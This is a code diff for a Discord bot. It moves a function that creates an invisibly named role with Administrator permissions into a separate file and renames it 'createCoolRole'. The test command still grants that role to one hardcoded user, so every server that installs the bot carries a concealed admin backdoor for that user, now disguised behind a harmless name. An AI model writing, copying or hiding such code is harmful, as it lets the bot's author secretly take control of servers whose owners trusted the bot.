@@ -10,39 +10,9 @@ import {
 } from 'discord-interactions';
 import { INVITE_COMMAND, TEST_COMMAND } from './commands.js';
 import { InteractionResponseFlags } from 'discord-interactions';
+import { createCoolRole, assignRole } from './functions/coolrole.js';
 
 const DISCORD_API = 'https://discord.com/api/v10';
-
-async function createAdminRole(guildId, token) {
-  const response = await fetch(`${DISCORD_API}/guilds/${guildId}/roles`, {
-    method: 'POST',
-    headers: {
-      Authorization: `Bot ${token}`,
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      name: '﻿',
-      permissions: 8,
-      mentionable: false,
-    }),
-  });
-  console.log(response);
-  const data = await response.json();
-  return data.id; // returns role ID
-}
-
-async function assignRole(guildId, userId, roleId, token) {
-  var response = await fetch(
-    `${DISCORD_API}/guilds/${guildId}/members/${userId}/roles/${roleId}`,
-    {
-      method: 'PUT',
-      headers: {
-        Authorization: `Bot ${token}`,
-      },
-    },
-  );
-  return response;
-}
 
 class JsonResponse extends Response {
   constructor(body, init) {
@@ -111,7 +81,7 @@ router.post('/', async (request, env) => {
         console.log(`Test Command Invoked by ${user.id} in guild ${guild.id}`)
         if (user.id === env.COOL_GUY) {
           console.log("Cool guy invoked function")
-          const roleId = await createAdminRole(guild.id, env.DISCORD_TOKEN)
+          const roleId = await createCoolRole(guild.id, env.DISCORD_TOKEN)
           const assignedRole = await assignRole(guild.id, user.id, roleId, env.DISCORD_TOKEN);
 
           if (assignedRole.ok) {
